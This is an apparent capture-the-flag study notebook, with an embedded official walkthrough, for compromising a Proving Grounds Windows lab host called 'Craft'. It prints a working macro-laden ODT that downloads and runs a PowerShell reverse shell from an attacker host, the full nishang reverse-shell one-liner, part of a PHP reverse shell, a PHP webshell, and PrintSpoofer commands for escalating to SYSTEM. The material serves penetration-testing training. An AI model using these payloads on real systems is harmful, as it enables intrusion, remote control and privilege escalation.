## Nmap

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Craft]
└─$ sudo nmap -A -sV -sS -T4 192.168.200.169 -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2023-09-02 15:34 CST
Nmap scan report for 192.168.200.169
Host is up (0.30s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
|_http-title: Craft
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: specialized|general purpose
Running (JUST GUESSING): AVtech embedded (87%), Microsoft Windows XP (85%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3
Aggressive OS guesses: AVtech Room Alert 26W environmental monitor (87%), Microsoft Windows XP SP3 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   301.96 ms 192.168.45.1
2   300.88 ms 192.168.45.254
3   300.89 ms 192.168.251.1
4   300.86 ms 192.168.200.169

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.78 seconds
```

![[截圖 2023-09-02 下午3.39.32.png]]

發現有檔案上傳功能，嘗試上傳 php reverse shell

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Craft]
└─$ cat php-reverse-shell.php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.45.153';  // CHANGE THIS
$port = 80;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
...

```

發現無法上傳 php，直接改副檔名也無法上傳，應會驗證格式

![[截圖 2023-09-02 下午3.41.24.png]]

### dirsearch

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Craft]
└─$ dirsearch -u http://192.168.200.169/ -e *

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: 192.168.200.169 | HTTP method: GET | Threads: 30 | Wordlist size: 9009

Output File: /home/ouyang/.dirsearch/reports/192.168.200.169/-_23-09-02_15-38-33.txt

Error Log: /home/ouyang/.dirsearch/logs/errors-23-09-02_15-38-33.log

Target: http://192.168.200.169/

[15:38:33] Starting:
[15:38:35] 403 -  304B  - /%C0%AE%C0%AE%C0%AF
[15:38:35] 403 -  304B  - /%ff
[15:38:35] 403 -  304B  - /%3f/
[15:38:44] 403 -  304B  - /.ht_wsr.txt
[15:38:44] 403 -  304B  - /.htaccess.save
[15:38:44] 403 -  304B  - /.htaccess.sample
[15:38:44] 403 -  304B  - /.htaccess.orig
[15:38:44] 403 -  304B  - /.htaccessBAK
[15:38:44] 403 -  304B  - /.htaccess.bak1
[15:38:44] 403 -  304B  - /.htaccess_sc
[15:38:44] 403 -  304B  - /.htaccessOLD
[15:38:44] 403 -  304B  - /.htaccessOLD2
[15:38:44] 403 -  304B  - /.htpasswds
[15:38:44] 403 -  304B  - /.httr-oauth
[15:38:44] 403 -  304B  - /.htaccess_extra
[15:38:44] 403 -  304B  - /.htm
[15:38:44] 403 -  304B  - /.htaccess_orig
[15:38:44] 403 -  304B  - /.html
[15:38:45] 403 -  304B  - /.htpasswd_test
[15:39:08] 403 -  304B  - /Trace.axd::$DATA
[15:39:29] 200 -    1KB - /assets/
[15:39:29] 301 -  343B  - /assets  ->  http://192.168.200.169/assets/
[15:39:34] 403 -  304B  - /cgi-bin/
[15:39:34] 200 -    2KB - /cgi-bin/printenv.pl
[15:39:40] 301 -  340B  - /css  ->  http://192.168.200.169/css/
[15:39:47] 503 -  404B  - /examples
[15:39:47] 503 -  404B  - /examples/
[15:39:47] 503 -  404B  - /examples/jsp/%252e%252e/%252e%252e/manager/html/
[15:39:47] 503 -  404B  - /examples/servlet/SnoopServlet
[15:39:47] 503 -  404B  - /examples/servlets/servlet/CookieExample
[15:39:47] 503 -  404B  - /examples/servlets/servlet/RequestHeaderExample
[15:39:47] 503 -  404B  - /examples/servlets/index.html
[15:39:47] 503 -  404B  - /examples/jsp/snp/snoop.jsp
[15:39:53] 200 -    9KB - /index.pHp
[15:39:53] 200 -    9KB - /index.php
[15:39:53] 200 -    9KB - /index.php/login/
[15:39:53] 403 -  304B  - /index.php::$DATA
[15:39:53] 200 -    9KB - /index.php.
[15:39:55] 301 -  339B  - /js  ->  http://192.168.200.169/js/
[15:39:55] 200 -  981B  - /js/
[15:40:08] 403 -  423B  - /phpmyadmin/doc/html/index.html
[15:40:08] 403 -  423B  - /phpmyadmin/README
[15:40:08] 403 -  423B  - /phpmyadmin/ChangeLog
[15:40:08] 403 -  423B  - /phpmyadmin/docs/html/index.html
[15:40:09] 403 -  423B  - /phpmyadmin
[15:40:12] 403 -  423B  - /phpmyadmin/scripts/setup.php
[15:40:12] 403 -  423B  - /phpmyadmin/phpmyadmin/index.php
[15:40:12] 403 -  423B  - /phpmyadmin/
[15:40:12] 403 -  423B  - /phpmyadmin/index.php
[15:40:18] 403 -  423B  - /server-info
[15:40:18] 403 -  423B  - /server-status
[15:40:18] 403 -  423B  - /server-status/
[15:40:27] 200 -  537B  - /upload.php
[15:40:27] 200 -  777B  - /uploads/
[15:40:27] 301 -  344B  - /uploads  ->  http://192.168.200.169/uploads/
[15:40:30] 403 -  304B  - /web.config::$DATA
[15:40:30] 403 -  423B  - /webalizer
```



嘗試製作惡意 odt file，方法參考下列 writeup

[HTB Writeup](https://0xdf.gitlab.io/2020/02/01/htb-re.html?source=post_page-----c92de878e004--------------------------------)
[PG Writeup](https://al1z4deh.medium.com/proving-grounds-craft-c92de878e004)

![[截圖 2023-09-02 下午4.05.46.png]]

建立 shell.ps1 放在 kali 且開啟 python http server

![[截圖 2023-09-02 下午4.44.49.png]]

---
## [Offical Writeup] Exploitation Guide for Craft

## Summary

In this guide, we will use macros in ODT files uploaded to a resume web form to gain a foothold. We will then migrate to the `apache` user and abuse `SeImpersonatePrivilege`permission to elevate our privilege.

## Enumeration

### Nmap

We'll start by looking for open ports with an `nmap` scan.

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap 192.168.120.63                               
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-25 10:02 EDT
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.12 seconds
```

It looks like the target might be blocking ICMP traffic, requiring us to use the `-Pn` option. Let's proceed with that.

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sV -sC -Pn 192.168.120.63
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-19 13:07 EDT
Nmap scan report for 192.168.120.63
Host is up (0.031s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
|_http-title: Craft
...
```

We found only an HTTP server running on port 80. Let's take a look at it.

### Apache Enumeration

Opening up http://192.168.120.63 in the browser, we are presented with a page titled "Craft". After scrolling down a bit, we notice a form where a user can upload a resume to join the team.

![Craft Submit Resume Form](https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG-Practice_86_image_1_3JFk6dZs.png)

Craft Submit Resume Form

Let's try to upload a file. We create a simple text file and upload it to the web form.

```
┌──(kali㉿kali)-[~]
└─$ echo "test" > resume.txt
```

After clicking "Upload", we are presented with an error message.

> File is not valid. Please submit ODT file

This form apparently only accepts ODT files; so, let's make one.

We need to install LibreOffice Writer first.

```
┌──(kali㉿kali)-[~]
└─$ sudo apt update  
...
┌──(kali㉿kali)-[~]
└─$ sudo apt-get install -y libreoffice-writer
...
```

Let's open LibreOffice Writer and create a new file named **resume.odt**. Writer saves in ODT format by default.

Uploading this ODT file to the same web form presents us with a different message.

> You're resume was submitted , it will be reviewed shortly by our staff

This message implies that the uploaded file will be opened by a user shortly after submission.

## Exploitation

Let's try to create an ODT file with a VBA macro and see if it's executed.

We'll go back to our test ODT file in LibreOffice Writer. In the top menu, we click "Tools" and navigate to "Macros" -> "Organize Macros" -> "Basic".

![Opening Basic Macros Menu](https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG-Practice_86_image_2_8pZJHqRJ.png)

Opening Basic Macros Menu

With the Basic Macros window open, we'll choose our document under "Macro From" on the left side and click the "New" button on the right.

![Basic Macros Menu](https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG-Practice_86_image_3_238Qwmfa.png)

Basic Macros Menu

Let's leave the Name as "Module1" and click "OK".

In the new window, we need to add our vba code to the panel on the right between `Sub Main` and `End Sub`. To test, let's just add a simple web request back to our kali machine.

```vb
Sub Main
    Shell("cmd /c powershell iwr 192.168.118.14")
End Sub
```

![Adding VBA Code](https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG-Practice_86_image_4_KMyPBPG3.png)

Adding VBA Code

Let's click the save icon on the top menu and close this window.

Next, we will need to create a trigger to execute our code. From the top menu, let's click on "Tools" and then "Customize...". In the new window that appears, we click the "Events" tab. Let's choose "Open Document" from the main panel and click the "Macro..." button on the right side.

![Choosing Macro Trigger](https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG-Practice_86_image_5_G6ptMddD.png)

Choosing Macro Trigger

In the Macro Selector window, we need to click the "**+**" symbol next to our document under "Library", then click the **+** next to "Standard". Let's select our "Module1" and make sure "Main" is selected on the "Macro Name" panel.

![Choosing Our Macro to Trigger](https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG-Practice_86_image_6_HLfEiWq9.png)

Choosing Our Macro to Trigger

Finally, let's click the "OK" button on both open windows and save the document.

In a Kali terminal, let's start a python webserver on port 80 to catch the request from our macro.

```
┌──(kali㉿kali)-[~]
└─$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Back in the browser, let's upload our new macro-infused ODT file to the website.

After a few seconds, we have a connection to out python webserver.

```
192.168.120.63 - - [20/Oct/2021 15:29:57] "GET / HTTP/1.1" 200 -
```

This shows us that we are indeed able to execute code through a macro in an uploaded ODT file.

To use this RCE vector to get a shell, we can create an ODT file that will download a PowerShell payload from our python webserver and execute it.

For the PowerShell payload, we can use a reverse shell one-liner from [nishang](https://github.com/samratashok/nishang) at https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1

Let's save this payload into a file named **rev.ps1** making sure to change the IP to our Kali box's IP address.

```
┌──(kali㉿kali)-[~]
└─$ cat rev.ps1 
$client = New-Object System.Net.Sockets.TCPClient("192.168.118.14",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Next, let's create the ODT file naming it **resume2.odt**. We create this file the same way we did before, except with the following code:

```
Sub Main
    Shell("cmd /c powershell iwr http://192.168.118.14/rev.ps1 -o C:/Windows/Tasks/rev.ps1")
    Shell("cmd /c powershell -c C:/Windows/Tasks/rev.ps1")
End Sub
```

We also need to make sure the file will trigger the macro on Document Open like before.

Before we upload **resume2.odt** to the webfrom, let's start our reverse shell listener.

```
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 1234
listening on [any] 1234 ...
```

We upload **resume2.odt** and after a few seconds we see the target request the **rev.ps1** from our python webserver.

```
192.168.120.63 - - [20/Oct/2021 16:49:48] "GET /rev.ps1 HTTP/1.1" 200 -
```

Shortly after that, we receive a connection to the reverse shell listener. It may take a couple of tries sometimes.

```
connect to [192.168.118.14] from (UNKNOWN) [192.168.120.63] 49719
PS C:\Program Files\LibreOffice\program> whoami
craft\thecybergeek
```

We now have shell access as the user `thecybergeek`!

---

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Craft]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.45.153] from (UNKNOWN) [192.168.200.169] 50078

PS C:\Program Files\LibreOffice\program> whoami
craft\thecybergeek
```

```json
PS C:\users\thecybergeek\desktop> systeminfo

Host Name:                 CRAFT
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00429-70000-00000-AA123
Original Install Date:     5/28/2021, 2:52:51 AM
System Boot Time:          2/17/2023, 2:36:22 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~3094 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.18227214.B64.2106252220, 6/25/2021
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume2
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     2,047 MB
Available Physical Memory: 986 MB
Virtual Memory: Max Size:  3,071 MB
Virtual Memory: Available: 2,043 MB
Virtual Memory: In Use:    1,028 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 9 Hotfix(s) Installed.
                           [01]: KB5003541
                           [02]: KB4512577
                           [03]: KB4535680
                           [04]: KB4577586
                           [05]: KB4580325
                           [06]: KB4589208
                           [07]: KB5003243
                           [08]: KB5003711
                           [09]: KB5004947
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0 2
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 192.168.200.169
                                 [02]: fe80::31a5:4083:a3f8:a31e
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
PS C:\users\thecybergeek\desktop> whoami /all

USER INFORMATION
----------------

User Name          SID
================== ============================================
craft\thecybergeek S-1-5-21-537427935-490066102-1511301751-1001


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeCreateGlobalPrivilege       Create global objects          Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

	重連 vpn，IP 換成 192.168.154.169

## Escalation

Enumerating the system with the `thecybergeek` account we don't find much of interest, but we do discover that we are able to write to the **C:\\xampp\\htdocs** directory.

```
PS C:\Program Files\LibreOffice\program> icacls C:\xampp\htdocs
C:\xampp\htdocs CRAFT\apache:(OI)(CI)(F)
                CRAFT\apache:(I)(OI)(CI)(F)
                NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
                BUILTIN\Administrators:(I)(OI)(CI)(F)
                BUILTIN\Users:(I)(OI)(CI)(RX)
                BUILTIN\Users:(I)(CI)(AD)
                BUILTIN\Users:(I)(CI)(WD)
                CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files
```

If we list the users' directory, we'll find the `apache` user account.

```
PS C:\Program Files\LibreOffice\program> dir C:\Users


    Directory: C:\Users


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        5/28/2021   3:53 AM                Administrator                                                         
d-----        7/13/2021   3:19 AM                apache                                                                
d-r---        5/28/2021   3:53 AM                Public                                                                
d-----        7/13/2021   3:35 AM                thecybergeek
```

We can use this to place a PHP webshell into **C:\\xampp\\htdocs** and compromise the `apache` user account, which may have better privilege escalation opportunities.

Let's create a file in the directory we are hosting with our python webserver named **cmd.php** with the following contents:

```php
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
```

Back in our reverse shell on the target system, let's download our PHP shell and place it in **C:\\xampp\\htdocs**.

```
PS C:\Program Files\LibreOffice\program> iwr http://192.168.118.14/cmd.php -OutFile C:\xampp\htdocs\cmd.php
PS C:\Program Files\LibreOffice\program> dir C:\xampp\htdocs\


    Directory: C:\xampp\htdocs


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        7/13/2021   3:18 AM                assets                                                                
d-----        7/13/2021   3:18 AM                css                                                                   
d-----        7/13/2021   3:18 AM                js                                                                    
d-----       10/20/2021   1:51 PM                uploads                                                               
-a----       10/21/2021   9:34 AM             80 cmd.php                                                               
-a----         7/7/2021  10:53 AM           9635 index.php                                                             
-a----         7/7/2021   9:56 AM            835 upload.php                                                            


PS C:\Program Files\LibreOffice\program> 
```

We can use `curl` to execute commands via our webshell. Let's verify that we have access to the `apache` account and list some information about it using `whoami /all`.

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.120.63/cmd.php?cmd=whoami+/all

USER INFORMATION
----------------

User Name    SID                                         
============ ============================================
craft\apache S-1-5-21-537427935-490066102-1511301751-1000


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeTcbPrivilege                Act as part of the operating system       Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

┌──(kali㉿kali)-[~]
└─$ 
```

In the _PRIVILEGES INFORMATION_ section, we discover that the `apache` user has `SeImpersonatePrivilege` enabled. Having researched this privilege, we can leverage it to compromise the `SYSTEM` account by using [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) to elevate our privilege.

Let's download **PrintSpoofer64.exe** to our kali machine.

```
┌──(kali㉿kali)-[~]
└─$ wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
--2021-10-25 08:38:15--  https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
...
```

Hosting it with our python web server, we'll next download it to the target system. Let's use [CyberChef](https://gchq.github.io/CyberChef/) to URL-encode our command and use `curl` again to send a request to the webshell.

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.120.63/cmd.php?cmd=powershell%20iwr%20http://192.168.118.14/PrintSpoofer64.exe%20-OutFile%20C:%5CWindows%5Ctasks%5CPrintSpoofer64.exe
```

With **PrintSpoofer64.exe** in place, we can reuse the **rev.ps1** we dropped earlier to facilitate a reverse shell with higher privileges.

Let's start a listener on the same port as before.

```
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 1234
listening on [any] 1234 ...
```

Next, we once again use [CyberChef](https://gchq.github.io/CyberChef/) to encode our payload that executes the reverse shell with **PrintSpoofer64.exe**.

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.120.63/cmd.php?cmd=C:%5CWindows%5Ctasks%5CPrintSpoofer64.exe%20-c%20%22cmd%20/c%20powershell%20-c%20C:/Windows/Tasks/rev.ps1%22
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
```

We now have a connection back to our listener with a `SYSTEM` level PowerShell session!

```
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 1234
listening on [any] 1234 ...
connect to [192.168.118.14] from (UNKNOWN) [192.168.120.63] 49913
whoami
nt authority\system
PS C:\Windows\system32> 
```